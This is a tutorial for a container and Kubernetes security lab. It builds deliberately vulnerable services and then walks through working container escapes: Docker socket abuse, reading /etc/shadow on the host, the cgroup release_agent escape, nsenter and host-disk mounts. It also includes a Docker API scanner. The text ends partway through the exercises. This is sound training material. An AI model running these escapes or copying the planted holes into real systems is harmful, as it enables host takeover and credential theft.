# Tutorial: Container, Kubernetes, and Serverless Security — Hands-On Lab

> **Source reference:** domain10_chapter10B_container_k8s_serverless.md
> **Scope:** Docker daemon socket abuse, capabilities, seccomp, container escapes (nsenter, cgroup release_agent, core_pattern, runc CVEs), Kubernetes API server, RBAC escalation, Pod Security Standards, ServiceAccount token abuse, NetworkPolicy, admission controllers, etcd, kubelet API, lateral movement, persistence, serverless (Lambda/Functions) event injection, execution role abuse, serverless C2, image supply chain (signing, SBOM, scanning), runtime security (Falco, AppArmor, SELinux, Tetragon), service mesh (Istio mTLS, SPIFFE), cloud-managed K8s forensics, advanced attacks (kernel CVEs, webhook manipulation, sidecar injection), hardening (CIS benchmark, multi-tenancy, RuntimeClass).

---

## Lab Environment Setup

### Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        Lab Network (172.20.0.0/16)                      │
│                                                                         │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────────────┐  │
│  │ k3s-server   │  │ k3s-agent    │  │ registry                     │  │
│  │ K3s Control  │  │ K3s Worker   │  │ Harbor registry              │  │
│  │ Plane + etcd │  │ Node         │  │ w/ Trivy scanner             │  │
│  │ :6443 :2379  │  │ :10250       │  │ :5443                        │  │
│  │ 172.20.0.10  │  │ 172.20.0.11  │  │ 172.20.0.12                  │  │
│  └──────┬───────┘  └──────┬───────┘  └──────────────────────────────┘  │
│         │                  │                                            │
│  ┌──────┴──────────────────┴───────────────────────────────────────┐    │
│  │                    Kubernetes Cluster (K3s)                      │    │
│  │  ┌─────────┐ ┌──────────┐ ┌──────────┐ ┌─────────────────────┐ │    │
│  │  │ vuln-app│ │ db       │ │ attacker │ │ falco               │ │    │
│  │  │ Flask   │ │ Postgres │ │ Kali-like│ │ Runtime detection   │ │    │
│  │  │ :8080   │ │ :5432    │ │ tools    │ │ + Falcosidekick     │ │    │
│  │  └─────────┘ └──────────┘ └──────────┘ └─────────────────────┘ │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│                                                                         │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐                  │
│  │ docker-lab   │  │ localstack   │  │ elk          │                  │
│  │ Docker-in-   │  │ AWS Lambda   │  │ Elastic +    │                  │
│  │ Docker for   │  │ emulation    │  │ Kibana for   │                  │
│  │ escape labs  │  │ :4566        │  │ log analysis │                  │
│  │ 172.20.0.20  │  │ 172.20.0.30  │  │ :9200 :5601 │                  │
│  └──────────────┘  └──────────────┘  └──────────────┘                  │
└─────────────────────────────────────────────────────────────────────────┘
```

### Docker Compose — Lab Infrastructure

Save as `docker-compose.yml`:

```yaml
version: "3.9"

networks:
  lab-net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/16

volumes:
  k3s-server-data:
  k3s-agent-data:
  registry-data:
  elk-data:
  postgres-data:

services:
  # ── K3s Control Plane ──
  k3s-server:
    image: rancher/k3s:v1.29.4-k3s1
    container_name: k3s-server
    command: >
      server
      --disable=traefik
      --write-kubeconfig-mode=644
      --write-kubeconfig=/output/kubeconfig.yaml
      --kube-apiserver-arg=anonymous-auth=true
      --kube-apiserver-arg=audit-log-path=/var/log/kube-audit.log
      --kube-apiserver-arg=audit-policy-file=/etc/kubernetes/audit-policy.yaml
    privileged: true
    environment:
      - K3S_TOKEN=lab-secret-token
      - K3S_KUBECONFIG_OUTPUT=/output/kubeconfig.yaml
    volumes:
      - k3s-server-data:/var/lib/rancher/k3s
      - ./kubeconfig:/output
      - ./manifests:/var/lib/rancher/k3s/server/manifests/custom
      - ./audit-policy.yaml:/etc/kubernetes/audit-policy.yaml
    ports:
      - "6443:6443"
      - "10250:10250"
    networks:
      lab-net:
        ipv4_address: 172.20.0.10

  # ── K3s Worker Node ──
  k3s-agent:
    image: rancher/k3s:v1.29.4-k3s1
    container_name: k3s-agent
    command: agent
    privileged: true
    environment:
      - K3S_URL=https://k3s-server:6443
      - K3S_TOKEN=lab-secret-token
    volumes:
      - k3s-agent-data:/var/lib/rancher/k3s
    depends_on:
      - k3s-server
    networks:
      lab-net:
        ipv4_address: 172.20.0.11

  # ── Docker-in-Docker Lab (for container escape exercises) ──
  docker-lab:
    image: docker:26-dind
    container_name: docker-lab
    privileged: true
    environment:
      - DOCKER_TLS_CERTDIR=
    volumes:
      - ./escape-labs:/labs
    networks:
      lab-net:
        ipv4_address: 172.20.0.20

  # ── LocalStack (Lambda emulation) ──
  localstack:
    image: localstack/localstack:3.4
    container_name: localstack
    environment:
      - SERVICES=lambda,s3,iam,logs,apigateway,dynamodb,sqs,sts
      - LAMBDA_EXECUTOR=docker
      - DOCKER_HOST=unix:///var/run/docker.sock
      - DEFAULT_REGION=us-east-1
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
      - ./lambda-labs:/labs
    ports:
      - "4566:4566"
    networks:
      lab-net:
        ipv4_address: 172.20.0.30

  # ── ELK Stack (log analysis) ──
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.13.0
    container_name: elasticsearch
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
      - "ES_JAVA_OPTS=-Xms512m -Xmx512m"
    volumes:
      - elk-data:/usr/share/elasticsearch/data
    ports:
      - "9200:9200"
    networks:
      lab-net:

  kibana:
    image: docker.elastic.co/kibana/kibana:8.13.0
    container_name: kibana
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200
    ports:
      - "5601:5601"
    depends_on:
      - elasticsearch
    networks:
      lab-net:

  # ── PostgreSQL (target database for K8s exercises) ──
  postgres:
    image: postgres:16-alpine
    container_name: postgres
    environment:
      - POSTGRES_USER=appuser
      - POSTGRES_PASSWORD=SuperSecret123!
      - POSTGRES_DB=production
    volumes:
      - postgres-data:/var/lib/postgresql/data
    networks:
      lab-net:
```

### Kubernetes Audit Policy

Save as `audit-policy.yaml`:

```yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  - level: RequestResponse
    resources:
      - group: ""
        resources: ["secrets", "configmaps"]
    verbs: ["get", "list", "watch", "create", "update", "delete"]
  - level: RequestResponse
    resources:
      - group: ""
        resources: ["pods", "pods/exec", "pods/attach", "pods/portforward"]
    verbs: ["create", "update", "patch", "delete"]
  - level: RequestResponse
    resources:
      - group: "rbac.authorization.k8s.io"
        resources: ["clusterroles", "clusterrolebindings", "roles", "rolebindings"]
  - level: Metadata
    resources:
      - group: "admissionregistration.k8s.io"
        resources: ["mutatingwebhookconfigurations", "validatingwebhookconfigurations"]
  - level: Metadata
    resources:
      - group: "apps"
        resources: ["deployments", "daemonsets", "replicasets"]
  - level: None
    users: ["system:kube-proxy"]
    verbs: ["watch"]
    resources:
      - group: ""
        resources: ["endpoints", "services"]
  - level: None
    nonResourceURLs: ["/healthz*", "/version", "/readyz*"]
```

### Bootstrap Script

Save as `bootstrap.sh`:

```bash
#!/usr/bin/env bash
set -euo pipefail

echo "[*] Starting lab infrastructure..."
docker compose up -d

echo "[*] Waiting for K3s API server to become ready..."
until docker exec k3s-server kubectl get nodes --kubeconfig=/output/kubeconfig.yaml 2>/dev/null; do
    sleep 3
done

echo "[*] Copying kubeconfig..."
mkdir -p ./kubeconfig
docker cp k3s-server:/output/kubeconfig.yaml ./kubeconfig/kubeconfig.yaml
sed -i 's|https://127.0.0.1:6443|https://172.20.0.10:6443|' ./kubeconfig/kubeconfig.yaml
export KUBECONFIG="$(pwd)/kubeconfig/kubeconfig.yaml"

echo "[*] Creating lab namespaces..."
kubectl create namespace production --dry-run=client -o yaml | kubectl apply -f -
kubectl create namespace attacker --dry-run=client -o yaml | kubectl apply -f -
kubectl create namespace kube-system --dry-run=client -o yaml | kubectl apply -f -

echo "[*] Deploying vulnerable application..."
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: ServiceAccount
metadata:
  name: overprivileged-sa
  namespace: production
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: overprivileged-sa-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
  - kind: ServiceAccount
    name: overprivileged-sa
    namespace: production
---
apiVersion: v1
kind: Secret
metadata:
  name: db-credentials
  namespace: production
type: Opaque
data:
  username: YXBwdXNlcg==
  password: U3VwZXJTZWNyZXQxMjMh
  connection_string: cG9zdGdyZXNxbDovL2FwcHVzZXI6U3VwZXJTZWNyZXQxMjMhQHBvc3RncmVzOjU0MzIvcHJvZHVjdGlvbg==
---
apiVersion: v1
kind: Secret
metadata:
  name: api-keys
  namespace: production
type: Opaque
data:
  stripe_key: c2tfdGVzdF80ZUMzOUhxTFlncWlEMGRvcVVLamNWckhW
  aws_access_key: QUtJQVhFWEFNUExFS0VZ
  aws_secret_key: d0phbHJYVXRuRkVNSS9LN01ERU5HL2JQeFJmaUNZRVhBTVBMRUtFWQ==
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vuln-app
  namespace: production
spec:
  replicas: 1
  selector:
    matchLabels:
      app: vuln-app
  template:
    metadata:
      labels:
        app: vuln-app
    spec:
      serviceAccountName: overprivileged-sa
      containers:
        - name: app
          image: python:3.12-slim
          command: ["/bin/sh", "-c"]
          args:
            - |
              pip install flask requests > /dev/null 2>&1
              cat > /app.py << 'PYEOF'
              from flask import Flask, request, jsonify
              import subprocess, os
              app = Flask(__name__)
              
              @app.route('/healthz')
              def health():
                  return jsonify({"status": "ok"})
              
              @app.route('/api/exec', methods=['POST'])
              def run_cmd():
                  cmd = request.json.get('cmd', '')
                  try:
                      result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                      return jsonify({"stdout": result.stdout, "stderr": result.stderr, "code": result.returncode})
                  except Exception as e:
                      return jsonify({"error": str(e)}), 500
              
              @app.route('/api/fetch', methods=['POST'])
              def fetch_url():
                  import requests as req
                  url = request.json.get('url', '')
                  try:
                      resp = req.get(url, timeout=5)
                      return jsonify({"status": resp.status_code, "body": resp.text[:4096]})
                  except Exception as e:
                      return jsonify({"error": str(e)}), 500
              
              if __name__ == '__main__':
                  app.run(host='0.0.0.0', port=8080)
              PYEOF
              python /app.py
          ports:
            - containerPort: 8080
          env:
            - name: DB_PASSWORD
              valueFrom:
                secretKeyRef:
                  name: db-credentials
                  key: password
            - name: STRIPE_KEY
              valueFrom:
                secretKeyRef:
                  name: api-keys
                  key: stripe_key
          volumeMounts:
            - name: secrets-vol
              mountPath: /mnt/secrets
              readOnly: true
      volumes:
        - name: secrets-vol
          secret:
            secretName: api-keys
---
apiVersion: v1
kind: Service
metadata:
  name: vuln-app
  namespace: production
spec:
  selector:
    app: vuln-app
  ports:
    - port: 8080
      targetPort: 8080
EOF

echo "[*] Deploying attacker pod..."
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: ServiceAccount
metadata:
  name: attacker-sa
  namespace: attacker
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: attacker-role
  namespace: attacker
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list", "create"]
  - apiGroups: [""]
    resources: ["pods/exec"]
    verbs: ["create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: attacker-binding
  namespace: attacker
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: attacker-role
subjects:
  - kind: ServiceAccount
    name: attacker-sa
    namespace: attacker
---
apiVersion: v1
kind: Pod
metadata:
  name: attacker
  namespace: attacker
spec:
  serviceAccountName: attacker-sa
  containers:
    - name: attacker
      image: alpine:3.19
      command: ["/bin/sh", "-c"]
      args:
        - |
          apk add --no-cache curl jq nmap bind-tools bash python3 > /dev/null 2>&1
          echo "[*] Attacker pod ready"
          sleep infinity
EOF

echo "[*] Setting up Docker escape lab containers..."
mkdir -p ./escape-labs

cat > ./escape-labs/Dockerfile.victim <<'EOF'
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y curl net-tools iproute2 strace procps && rm -rf /var/lib/apt/lists/*
CMD ["sleep", "infinity"]
EOF

docker exec docker-lab sh -c '
  cd /labs && \
  docker build -t victim:latest -f Dockerfile.victim . 2>/dev/null
'

echo "[*] Provisioning LocalStack Lambda functions..."
docker exec localstack bash -c '
  awslocal iam create-role --role-name lambda-exec-role \
    --assume-role-policy-document "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"lambda.amazonaws.com\"},\"Action\":\"sts:AssumeRole\"}]}" 2>/dev/null

  awslocal iam attach-role-policy --role-name lambda-exec-role \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess 2>/dev/null

  mkdir -p /tmp/lambda-code
  cat > /tmp/lambda-code/handler.py << PYEOF
import subprocess, os, json
def handler(event, context):
    action = event.get("action", "info")
    if action == "exec":
        cmd = event.get("cmd", "id")
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return {"stdout": result.stdout, "stderr": result.stderr}
    elif action == "env":
        return {"env": dict(os.environ)}
    elif action == "persist":
        with open("/tmp/beacon", "w") as f:
            f.write("persistent-payload")
        return {"persisted": True, "tmp_exists": os.path.exists("/tmp/beacon")}
    return {"function": context.function_name, "version": context.function_version}
PYEOF

  cd /tmp/lambda-code && zip -r /tmp/handler.zip handler.py 2>/dev/null

  awslocal lambda create-function \
    --function-name vulnerable-processor \
    --runtime python3.12 \
    --handler handler.handler \
    --role arn:aws:iam::000000000000:role/lambda-exec-role \
    --zip-file fileb:///tmp/handler.zip \
    --environment Variables={DB_HOST=prod-db.internal,DB_PASSWORD=ProdPassword456!,API_KEY=sk-live-abcdef123456} 2>/dev/null

  awslocal s3 mb s3://upload-bucket 2>/dev/null
  awslocal s3 mb s3://sensitive-data 2>/dev/null
  echo "SSN: 123-45-6789" | awslocal s3 cp - s3://sensitive-data/pii/records.csv 2>/dev/null

  awslocal dynamodb create-table \
    --table-name c2-tasking \
    --attribute-definitions AttributeName=implant_id,AttributeType=S \
    --key-schema AttributeName=implant_id,KeyType=HASH \
    --billing-mode PAY_PER_REQUEST 2>/dev/null
'

echo ""
echo "================================================================"
echo "  Lab Ready"
echo "  KUBECONFIG: export KUBECONFIG=$(pwd)/kubeconfig/kubeconfig.yaml"
echo "  K3s API:    https://172.20.0.10:6443"
echo "  LocalStack: http://172.20.0.30:4566"
echo "  Kibana:     http://localhost:5601"
echo "  Docker Lab: docker exec -it docker-lab sh"
echo "================================================================"
```

### Tool Requirements

| Tool | Purpose | Install |
|------|---------|---------|
| kubectl | Kubernetes CLI | `curl -LO https://dl.k8s.io/release/v1.29.4/bin/linux/amd64/kubectl` |
| docker / docker compose | Lab infrastructure | System package |
| trivy | Image scanning | `curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh \| sh` |
| cosign | Image signing | `go install github.com/sigstore/cosign/v2/cmd/cosign@latest` |
| syft | SBOM generation | `curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh \| sh` |
| grype | Vulnerability scan | `curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh \| sh` |
| kubeseal | Sealed Secrets CLI | `brew install kubeseal` or binary from GitHub |
| kube-bench | CIS benchmark | `go install github.com/aquasecurity/kube-bench@latest` |
| jq | JSON processing | System package |
| nmap | Network scanning | System package |
| aws (CLI) | LocalStack interaction | `pip install awscli-local` |

---

## PART A: OFFENSIVE (Attack Scenarios)

### Exercise 1: Docker Socket Escape — Socket Mount to Host Root

**Objective.** Demonstrate full host compromise via a container with the Docker socket mounted. Exploit both the Unix socket and TCP API exposure vectors.

**Background.** The Docker daemon socket at `/var/run/docker.sock` grants full daemon control — any process that reaches it can create privileged containers with host filesystem access. This is not a bug; the misconfiguration is mounting the socket into an untrusted container.

#### Step 1 — Launch a container with socket mount

```bash
# Inside the docker-lab (docker exec -it docker-lab sh)
# Create a container with the Docker socket mounted (simulating misconfiguration)
docker run -d \
  --name socket-victim \
  -v /var/run/docker.sock:/var/run/docker.sock \
  alpine:3.19 sleep infinity

docker exec -it socket-victim sh
```

#### Step 2 — Exploit via Docker CLI

```bash
# Inside socket-victim: install Docker CLI
apk add --no-cache docker-cli

# Verify socket access
docker version
docker ps
docker images

# Create a new privileged container with host root filesystem
docker run -it --privileged --pid=host -v /:/hostfs alpine:3.19 chroot /hostfs

# Now executing as root on the host
cat /etc/shadow
id
whoami  # root
ls /var/lib/rancher  # K3s data if on K3s host
```

#### Step 3 — Exploit via raw socket API (no Docker CLI needed)

```bash
# Inside socket-victim (without Docker CLI)
apk add --no-cache curl jq

# Enumerate via socket API
curl -s --unix-socket /var/run/docker.sock http://localhost/v1.43/version | jq .
curl -s --unix-socket /var/run/docker.sock http://localhost/v1.43/containers/json | jq '.[].Names'
curl -s --unix-socket /var/run/docker.sock http://localhost/v1.43/images/json | jq '.[].RepoTags'

# Create privileged container via API
CONTAINER_ID=$(curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.43/containers/create" \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine:3.19",
    "Cmd": ["/bin/sh", "-c", "cat /hostfs/etc/shadow > /tmp/shadow && sleep 3600"],
    "HostConfig": {
      "Binds": ["/:/hostfs"],
      "Privileged": true
    }
  }' | jq -r '.Id')

echo "Container ID: $CONTAINER_ID"

# Start the container
curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.43/containers/$CONTAINER_ID/start"

# Read the exfiltrated data
sleep 2
curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.43/containers/$CONTAINER_ID/exec" \
  -H "Content-Type: application/json" \
  -d '{"AttachStdout":true,"Cmd":["cat","/tmp/shadow"]}'
```

#### Step 4 — TCP API exposure exploitation

```bash
# On the docker-lab host, check if TCP API is exposed
# Docker-in-Docker often exposes on 2375/2376
nmap -p 2375,2376 172.20.0.20

# If TCP is exposed without TLS (port 2375)
curl -s http://172.20.0.20:2375/version
curl -s http://172.20.0.20:2375/containers/json | jq .

# Remote privileged container creation
curl -s -X POST http://172.20.0.20:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image":"alpine:3.19",
    "Cmd":["/bin/sh","-c","id && cat /hostfs/etc/shadow"],
    "HostConfig":{"Privileged":true,"Binds":["/:/hostfs"]}
  }'
```

**Expected output.** Full host filesystem access via both socket and TCP vectors. `/etc/shadow` contents readable from within the breakout container.

#### Step 5 — Build automated Docker socket scanner

Save as `docker_socket_scanner.py`:

```python
#!/usr/bin/env python3
"""Docker Socket and TCP API Scanner — detects exposed Docker daemons
and demonstrates exploitation paths."""

import http.client
import json
import socket
import sys
from typing import Optional
from urllib.parse import urlparse


class DockerAPIClient:
    """Minimal Docker Engine API client supporting both Unix socket and TCP."""

    def __init__(self, target: str):
        self.target = target
        self.is_socket = target.startswith("/") or target.startswith("unix://")

        if self.is_socket:
            self.socket_path = target.replace("unix://", "")
        else:
            parsed = urlparse(target if "://" in target else f"http://{target}")
            self.host = parsed.hostname or target.split(":")[0]
            self.port = parsed.port or 2375

    def _request(self, method: str, path: str, body: Optional[dict] = None) -> dict:
        if self.is_socket:
            conn = http.client.HTTPConnection("localhost")
            conn.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            conn.sock.connect(self.socket_path)
        else:
            conn = http.client.HTTPConnection(self.host, self.port, timeout=5)

        headers = {"Content-Type": "application/json"} if body else {}
        data = json.dumps(body).encode() if body else None
        conn.request(method, f"/v1.43{path}", body=data, headers=headers)
        resp = conn.getresponse()
        raw = resp.read().decode()
        conn.close()
        return json.loads(raw) if raw.strip() else {}

    def get(self, path: str) -> dict:
        return self._request("GET", path)

    def post(self, path: str, body: Optional[dict] = None) -> dict:
        return self._request("POST", path, body)


class DockerSocketScanner:
    """Scans for Docker daemon exposure and enumerates attack surface."""

    def __init__(self, target: str):
        self.client = DockerAPIClient(target)
        self.findings = []

    def scan(self) -> list[dict]:
        self._check_version()
        self._enumerate_containers()
        self._enumerate_images()
        self._check_privileged_containers()
        self._check_socket_mounts()
        self._check_sensitive_env_vars()
        return self.findings

    def _check_version(self):
        try:
            info = self.client.get("/version")
            self.findings.append({
                "type": "DOCKER_API_ACCESSIBLE",
                "severity": "CRITICAL",
                "details": {
                    "api_version": info.get("ApiVersion"),
                    "os": info.get("Os"),
                    "arch": info.get("Arch"),
                    "kernel": info.get("KernelVersion"),
                    "go_version": info.get("GoVersion"),
                },
            })

            system_info = self.client.get("/info")
            self.findings.append({
                "type": "DOCKER_SYSTEM_INFO",
                "severity": "HIGH",
                "details": {
                    "containers_running": system_info.get("ContainersRunning"),
                    "containers_total": system_info.get("Containers"),
                    "images": system_info.get("Images"),
                    "docker_root": system_info.get("DockerRootDir"),
                    "storage_driver": system_info.get("Driver"),
                    "security_options": system_info.get("SecurityOptions", []),
                },
            })
        except Exception as e:
            self.findings.append({
                "type": "DOCKER_API_NOT_ACCESSIBLE",
                "severity": "INFO",
                "details": {"error": str(e)},
            })

    def _enumerate_containers(self):
        try:
            containers = self.client.get("/containers/json?all=true")
            for c in containers:
                self.findings.append({
                    "type": "CONTAINER_FOUND",
                    "severity": "INFO",
                    "details": {
                        "id": c.get("Id", "")[:12],
                        "image": c.get("Image"),
                        "names": c.get("Names"),
                        "state": c.get("State"),
                        "status": c.get("Status"),
                        "ports": c.get("Ports"),
                    },
                })
        except Exception:
            pass

    def _enumerate_images(self):
        try:
            images = self.client.get("/images/json")
            for img in images:
                tags = img.get("RepoTags") or ["<none>"]
                self.findings.append({
                    "type": "IMAGE_FOUND",
                    "severity": "INFO",
                    "details": {
                        "id": img.get("Id", "")[:19],
                        "tags": tags,
                        "size_mb": round(img.get("Size", 0) / 1024 / 1024, 1),
                    },
                })
        except Exception:
            pass

    def _check_privileged_containers(self):
        try:
            containers = self.client.get("/containers/json")
            for c in containers:
                cid = c.get("Id")
                detail = self.client.get(f"/containers/{cid}/json")
                host_config = detail.get("HostConfig", {})

                if host_config.get("Privileged"):
                    self.findings.append({
                        "type": "PRIVILEGED_CONTAINER",
                        "severity": "CRITICAL",
                        "details": {
                            "id": cid[:12],
                            "image": detail.get("Config", {}).get("Image"),
                            "name": detail.get("Name"),
                            "pid_mode": host_config.get("PidMode"),
                            "network_mode": host_config.get("NetworkMode"),
                        },
                    })

                cap_add = host_config.get("CapAdd") or []
                dangerous_caps = {"SYS_ADMIN", "SYS_PTRACE", "SYS_MODULE", "NET_ADMIN",
                                  "DAC_READ_SEARCH", "SYS_RAWIO"}
                found_dangerous = set(cap_add) & dangerous_caps
                if found_dangerous:
                    self.findings.append({
                        "type": "DANGEROUS_CAPABILITIES",
                        "severity": "HIGH",
                        "details": {
                            "id": cid[:12],
                            "name": detail.get("Name"),
                            "dangerous_caps": list(found_dangerous),
                        },
                    })
        except Exception:
            pass

    def _check_socket_mounts(self):
        try:
            containers = self.client.get("/containers/json")
            for c in containers:
                cid = c.get("Id")
                detail = self.client.get(f"/containers/{cid}/json")
                mounts = detail.get("Mounts", [])
                for mount in mounts:
                    src = mount.get("Source", "")
                    if "docker.sock" in src:
                        self.findings.append({
                            "type": "DOCKER_SOCKET_MOUNTED",
                            "severity": "CRITICAL",
                            "details": {
                                "id": cid[:12],
                                "name": detail.get("Name"),
                                "source": src,
                                "destination": mount.get("Destination"),
                                "rw": mount.get("RW"),
                            },
                        })
                    if src == "/" or src == "/etc" or src == "/var":
                        self.findings.append({
                            "type": "HOST_PATH_MOUNTED",
                            "severity": "HIGH",
                            "details": {
                                "id": cid[:12],
                                "name": detail.get("Name"),
                                "source": src,
                                "destination": mount.get("Destination"),
                            },
                        })
        except Exception:
            pass

    def _check_sensitive_env_vars(self):
        sensitive_patterns = [
            "PASSWORD", "SECRET", "TOKEN", "KEY", "CREDENTIAL",
            "API_KEY", "AWS_ACCESS", "AWS_SECRET", "STRIPE",
        ]
        try:
            containers = self.client.get("/containers/json")
            for c in containers:
                cid = c.get("Id")
                detail = self.client.get(f"/containers/{cid}/json")
                env_vars = detail.get("Config", {}).get("Env", [])
                for env in env_vars:
                    name = env.split("=", 1)[0].upper()
                    for pattern in sensitive_patterns:
                        if pattern in name:
                            self.findings.append({
                                "type": "SENSITIVE_ENV_VAR",
                                "severity": "HIGH",
                                "details": {
                                    "id": cid[:12],
                                    "name": detail.get("Name"),
                                    "env_name": env.split("=", 1)[0],
                                    "env_value_preview": env.split("=", 1)[1][:8] + "..." if len(env.split("=", 1)) > 1 else "",
                                },
                            })
                            break
        except Exception:
            pass


def scan_tcp_range(subnet: str, ports: list[int] = None) -> list[str]:
    """Scan a subnet for exposed Docker TCP APIs."""
    if ports is None:
        ports = [2375, 2376]
    found = []
    base = ".".join(subnet.split(".")[:3])
    for host_part in range(1, 255):
        ip = f"{base}.{host_part}"
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            sock.close()
            if result == 0:
                try:
                    conn = http.client.HTTPConnection(ip, port, timeout=2)
                    conn.request("GET", "/v1.43/version")
                    resp = conn.getresponse()
                    if resp.status == 200:
                        data = json.loads(resp.read().decode())
                        found.append({
                            "ip": ip,
                            "port": port,
                            "api_version": data.get("ApiVersion"),
                            "os": data.get("Os"),
                        })
                    conn.close()
                except Exception:
                    pass
    return found


def print_report(findings: list[dict]):
    severity_colors = {
        "CRITICAL": "\033[91m",
        "HIGH": "\033[93m",
        "MEDIUM": "\033[33m",
        "INFO": "\033[36m",
    }
    reset = "\033[0m"

    print("\n" + "=" * 72)
    print("  DOCKER SOCKET / API SECURITY SCAN REPORT")
    print("=" * 72)

    critical_count = sum(1 for f in findings if f["severity"] == "CRITICAL")
    high_count = sum(1 for f in findings if f["severity"] == "HIGH")
    print(f"\n  Findings: {len(findings)} total | "
          f"{critical_count} CRITICAL | {high_count} HIGH\n")

    for finding in findings:
        sev = finding["severity"]
        color = severity_colors.get(sev, "")
        print(f"  {color}[{sev}]{reset} {finding['type']}")
        for key, val in finding["details"].items():
            print(f"    {key}: {val}")
        print()


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "/var/run/docker.sock"
    print(f"[*] Scanning Docker endpoint: {target}")

    scanner = DockerSocketScanner(target)
    findings = scanner.scan()
    print_report(findings)

    if len(sys.argv) > 2 and sys.argv[2] == "--scan-network":
        subnet = sys.argv[3] if len(sys.argv) > 3 else "172.20.0.0"
        print(f"\n[*] Scanning subnet {subnet}/24 for Docker TCP APIs...")
        tcp_results = scan_tcp_range(subnet)
        for r in tcp_results:
            print(f"  [CRITICAL] Docker API exposed at {r['ip']}:{r['port']} "
                  f"(API {r['api_version']}, OS: {r['os']})")
```

**Verification.** Run `python3 docker_socket_scanner.py /var/run/docker.sock` inside a container with the socket mounted. Confirm all containers, images, privileged containers, and socket mounts are enumerated.

---

### Exercise 2: Container Escape — Capabilities and Privileged Mode

**Objective.** Exploit `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, device access, and `--privileged` to break container isolation.

#### Step 1 — CAP_SYS_ADMIN + cgroup release_agent escape (CVE-2022-0492)

```bash
# Inside docker-lab: create a container with SYS_ADMIN
docker exec -it docker-lab sh

docker run -d --name cap-victim \
  --cap-add SYS_ADMIN \
  --security-opt apparmor=unconfined \
  victim:latest sleep infinity

docker exec -it cap-victim bash
```

Inside `cap-victim`:

```bash
# Step 1: Find the host path of the container's overlayfs upper layer
host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "[*] Host overlay path: $host_path"

# Step 2: Mount a cgroup controller
mkdir -p /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp

# Step 3: Create a child cgroup
mkdir /tmp/cgrp/exploit

# Step 4: Enable release notification
echo 1 > /tmp/cgrp/exploit/notify_on_release

# Step 5: Write payload to the container filesystem (visible from host via overlay)
cat > /cmd << 'PAYLOAD'
#!/bin/sh
id > /tmp/cgrp/escape_proof
hostname >> /tmp/cgrp/escape_proof
cat /etc/hostname >> /tmp/cgrp/escape_proof
uname -a >> /tmp/cgrp/escape_proof
PAYLOAD
chmod +x /cmd

# Step 6: Set release_agent to the payload path on the host
echo "$host_path/cmd" > /tmp/cgrp/release_agent
cat /tmp/cgrp/release_agent

# Step 7: Trigger the release by adding a process to the cgroup and letting it exit
sh -c "echo \$\$ > /tmp/cgrp/exploit/cgroup.procs && sleep 0"

# Step 8: Read the output
sleep 1
cat /tmp/cgrp/escape_proof
echo "[*] If you see the HOST hostname above, escape succeeded"
```

**Expected output.** The `escape_proof` file contains the host's hostname and `uid=0(root)`, proving kernel-level code execution on the host.

#### Step 2 — CAP_SYS_PTRACE + hostPID escape

```bash
# Create container with SYS_PTRACE and host PID namespace
docker exec -it docker-lab sh

docker run -d --name ptrace-victim \
  --cap-add SYS_PTRACE \
  --pid=host \
  victim:latest sleep infinity

docker exec -it ptrace-victim bash
```

Inside:

```bash
# View ALL host processes (because of --pid=host)
ps aux | head -20

# Find a host process to attach to
HOST_PID=$(ps aux | grep -v grep | grep "containerd" | head -1 | awk '{print $2}')
echo "[*] Target host PID: $HOST_PID"

# Use nsenter to enter all host namespaces
nsenter -t 1 -m -u -i -n -p -- /bin/sh -c "id && hostname && cat /etc/shadow | head -3"
```

#### Step 3 — Privileged container full escape

```bash
docker exec -it docker-lab sh

docker run -d --name priv-victim --privileged victim:latest sleep infinity
docker exec -it priv-victim bash
```

Inside:

```bash
# All capabilities available
cat /proc/self/status | grep Cap
capsh --print

# All devices accessible
ls -la /dev/sda* 2>/dev/null || ls -la /dev/vda* 2>/dev/null

# Mount host disk directly
fdisk -l 2>/dev/null
# If /dev/sda1 or /dev/vda1 exists:
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host 2>/dev/null || mount /dev/vda1 /mnt/host 2>/dev/null
ls /mnt/host/etc/shadow

